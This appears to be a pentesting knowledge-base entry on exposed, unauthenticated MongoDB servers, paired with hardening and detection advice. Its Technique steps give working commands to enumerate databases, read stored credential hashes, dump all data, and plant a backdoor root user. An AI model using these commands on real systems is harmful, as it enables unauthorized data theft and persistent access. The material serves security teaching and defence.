---
title: Exposed MongoDB
slug: mongodb-exposed
---

> **TL;DR:** MongoDB on 27017 with no auth or default credentials gives anonymous read/write to every database — historically the canonical mass-ransom target on Shodan.

## What it is
A MongoDB instance reachable on a network without authentication, or with default `admin:admin` style credentials. Until 3.6 the default bind was `0.0.0.0`; many lifted-and-shifted deployments still expose the port to the internet. Once connected, an attacker has full administrative access — dump collections, drop databases, leave a ransom note in a `WARNING` collection.

## Preconditions / where it applies
- TCP 27017 (or 27018/27019 for shard/config servers) reachable from the attacker network. Common on cloud VMs with an open security group, or developer machines on a corporate VPN.
- `--auth` not enabled, or `security.authorization: disabled` in `mongod.conf`.
- Sometimes auth is on but enforced only on a particular database — `admin` is open.

## Technique
1. **Discover.** `nmap -sV -p 27017 target`, Shodan `product:MongoDB`. Banner returns version and sometimes build info via `isMaster`.
2. **Connect.** `mongosh "mongodb://target:27017"` or older `mongo target:27017`. If a username is required without a password, try `admin`/empty.
3. **Enumerate.**

   ```javascript
   show dbs
   use <victim_db>
   show collections
   db.users.find().limit(5)
   db.runCommand({ buildInfo: 1 })
   ```

4. **Server status and users.**

   ```javascript
   db.adminCommand({listDatabases: 1})
   db.getSiblingDB("admin").system.users.find()   // shows configured users + hashed creds
   db.serverStatus()
   ```

5. **Dump.** `mongodump --uri "mongodb://target:27017" --out ./loot` exports every database to BSON.
6. **Write / persistence.** Drop a backdoor user: `db.getSiblingDB("admin").createUser({user:"x",pwd:"x",roles:["root"]})`. Set up a change stream or replication that copies writes off-site.
7. **Pivot.** Read app config collections for service tokens, AWS keys, SMTP credentials, JWT secrets ([[jwt]] forgery), and pivot from there.
8. **Related sink: [[nosql-injection]].** App-level operator injection can land you in the same place from a public web form.

## Detection and defence
- Bind to loopback or the private interface only (`bindIp: 127.0.0.1,10.0.0.5`). Never bind to `0.0.0.0` on an internet-reachable host.
- Enable SCRAM-SHA-256 auth and TLS for both clients and the inter-shard wire. Disable the legacy `MONGODB-CR` mechanism.
- Cloud: lock the security group / firewall to app subnets; use a managed offering (Atlas / DocumentDB) where the network is opinionated.
- Detection: net-flow alerts on inbound 27017 from outside the VPC, `mongod.log` `authentication failed` spikes, presence of a `WARNING`/`README` ransom collection.

## References
- [MongoDB Manual — Security checklist](https://www.mongodb.com/docs/manual/administration/security-checklist/) — official hardening.
- [HackTricks — MongoDB pentesting](https://book.hacktricks.wiki/en/network-services-pentesting/27017-27018-mongodb.html) — enumeration and commands.
- [Rapid7 — MongoDB exposure background](https://www.rapid7.com/blog/post/2017/01/11/mongodb-ransom-attacks/) — ransomware-campaign history.
